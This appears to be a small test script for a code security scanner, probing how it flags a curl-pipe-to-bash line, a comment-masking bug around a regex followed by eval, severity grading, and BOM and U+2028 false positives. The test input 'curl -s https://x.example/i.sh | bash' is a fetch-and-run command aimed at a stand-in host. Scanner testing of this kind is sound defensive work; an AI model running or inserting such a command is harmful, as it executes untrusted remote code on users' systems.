import { scanContent } from '/Users/timurmonasypov/Documents/GitHub/dsh-bridge/tools/scan/dist/index.js';
import { grade } from '/Users/timurmonasypov/Documents/GitHub/dsh-bridge/tools/scan/dist/report.js';
import { maskComments } from '/Users/timurmonasypov/Documents/GitHub/dsh-bridge/tools/scan/dist/rules/index.js';

// (a) M1 rerun
console.log('=== M1 rerun:', JSON.stringify(scanContent('curl -s https://x.example/i.sh | bash\n', 'scripts/setup.sh').map(f=>f.id)));

// (b) maskComments desync: regex containing escaped double quote
const dsrc = 'const re = /[\\"/];\neval(runsShell);\n';
console.log('=== b raw :', JSON.stringify(dsrc));
console.log('=== b mask:', JSON.stringify(maskComments(dsrc)));
console.log('=== b scan:', JSON.stringify(scanContent(dsrc, 'lib/app.js').map(f=>({id:f.id,sev:f.severity}))));

// (c) ten lows -> ?
const mk = (i, sev, fam) => ({ id:'L-'+i, ruleId:'r', family:fam, severity:sev, message:'m', path:'src/f'+i+'.js', line:1, col:1, excerpt:'', excerptSha256:'', confidence:0.8 });
console.log('=== c1 ten lows  ->', grade(Array.from({length:10},(_,i)=>mk(i,'low','FS'))).grade);
console.log('=== c2 nine lows ->', grade(Array.from({length:9},(_,i)=>mk(i,'low','FS'))).grade);

// (d) UTF-8 BOM false positive
console.log('=== d BOM:', JSON.stringify(scanContent('\uFEFFexport const ok = 1;\n', 'src/a.ts').map(f=>f.id)));

// (e) U+2028 line separator in a string
console.log('=== e U+2028:', JSON.stringify(scanContent('const s = "a\u2028b";\n', 'src/a.ts').map(f=>f.id)));
